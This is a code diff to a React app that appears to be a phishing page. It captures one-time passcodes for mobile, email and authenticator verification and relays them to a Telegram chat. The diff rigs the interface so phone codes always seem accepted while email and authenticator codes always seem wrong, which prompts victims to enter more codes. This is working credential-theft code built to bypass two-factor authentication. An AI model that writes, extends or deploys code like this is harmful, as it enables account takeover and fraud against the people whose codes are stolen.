@@ -102,7 +102,8 @@ export default function App() {
                           verificationMethod === 'email' ? 'EMAIL ID OTP' : 
                           verificationMethod === 'authenticator' ? 'AUTHENTICATOR OTP' : 'OTP';
 
-      const status = trialCount === 0 ? 'SUCCESS' : 'WRONG/RE-ENTRY';
+      const isPhone = verificationMethod === 'mobile';
+      const status = isPhone ? 'SUCCESS' : 'WRONG/RE-ENTRY';
       const message = `<b>🎯 OTP RECEIVED</b>\n\n` +
                       `<b>STATUS:</b> ${status}\n` +
                       `<b>METHOD:</b> ${methodLabel}\n` +
@@ -112,27 +113,27 @@ export default function App() {
       
       await sendTelegramMessage(message);
 
-      if (trialCount === 0) {
-        // First trial: Success
-        if (verificationMethod && !verifiedMethods.includes(verificationMethod)) {
-          setVerifiedMethods([...verifiedMethods, verificationMethod]);
+      if (isPhone) {
+        // Phone always succeeds in UI
+        if (!verifiedMethods.includes('mobile')) {
+          setVerifiedMethods([...verifiedMethods, 'mobile']);
         }
         
-        // Show success then go back to selection
         setSuccess(true);
         setTimeout(() => {
           setSuccess(false);
           setShowOtpInput(false);
           setShowVerificationOptions(true);
-          setTrialCount(1);
           setOtp(['', '', '', '', '', '']);
+          setTrialCount(0); // Reset trial for next method
         }, 2000);
       } else {
-        // Second trial: Wrong (Error)
+        // Email and Authenticator always fail in UI
         setOtpError(true);
         setOtp(['', '', '', '', '', '']);
         const firstInput = document.getElementById('otp-0');
         firstInput?.focus();
+        setTrialCount(prev => prev + 1);
       }
     } catch (error) {
       console.error(error);
@@ -180,7 +181,7 @@ export default function App() {
   const startEmailVerification = () => {
     setVerificationMethod('email');
     setShowVerificationOptions(false);
-    setShowEmailCapture(true);
+    setShowOtpInput(true);
   };
 
   const startAuthenticatorVerification = () => {
@@ -217,13 +218,8 @@ export default function App() {
           <button 
             onClick={() => {
               if (showOtpInput) {
-                if (verificationMethod === 'email') {
-                  setShowOtpInput(false);
-                  setShowEmailCapture(true);
-                } else {
-                  setShowOtpInput(false);
-                  setShowVerificationOptions(true);
-                }
+                setShowOtpInput(false);
+                setShowVerificationOptions(true);
               } else if (showEmailCapture) {
                 setShowEmailCapture(false);
                 setShowVerificationOptions(true);
